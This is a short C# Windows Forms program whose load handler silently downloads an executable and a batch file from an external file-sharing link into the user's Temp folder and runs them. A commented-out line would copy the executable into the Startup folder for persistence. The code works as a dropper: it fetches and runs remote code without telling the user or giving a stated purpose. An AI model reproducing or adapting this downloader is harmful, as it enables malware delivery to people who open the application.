using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace app
{
    public partial class Form1 : Form

    {
        WebClient webclient = new WebClient();
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Environment.CurrentDirectory = Environment.GetEnvironmentVariable("userprofile");
            DirectoryInfo info = new DirectoryInfo(".");
            //user dir var
            var profile = info.FullName;
            //making the full path
            var maindir = (profile + @"\AppData\Local\Temp");



            string file = maindir + @"\file.exe";
            bool fileexists = File.Exists(file);



            if (fileexists)
            {
                Process.Start(maindir + @"\file.exe");
            }
            else
            {

                {
                    //file download


                    webclient.DownloadFile("https://ann.nl.tab.digital/s/joLEcbqZdBLaZ7R/download/file.exe", maindir + @"\file.exe");

                    // Process.Start(maindir + @"\file.exe");                  

                    // File.Copy(@maindir +"\file.exe", @Environment.GetFolderPath(Environment.SpecialFolder.Startup/file.exe);

                    webclient.DownloadFile("https://ann.nl.tab.digital/s/HBg9ARKr4kcSBkd/download/file.bat", maindir + @"\file.bat");


                     Process.Start(maindir +@"\file.bat");
                    



                }
            }
        }
    }
}
    
